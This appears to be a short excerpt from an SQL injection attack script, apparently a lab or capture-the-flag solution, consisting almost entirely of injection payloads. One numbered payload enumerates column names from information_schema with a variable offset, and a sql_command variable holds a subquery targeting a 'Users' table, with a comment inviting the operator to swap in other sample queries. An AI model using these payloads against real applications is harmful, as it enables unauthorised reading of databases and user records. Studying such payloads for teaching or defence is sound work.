...
#6:'(Select column_name from information_schema.columns limit+'k'+,1)' //change k
...
sql_command="(Select column_name from information_schema.columns where table_name='Users' limit 2,1)" # replace this sql commands, you can use one from above sample
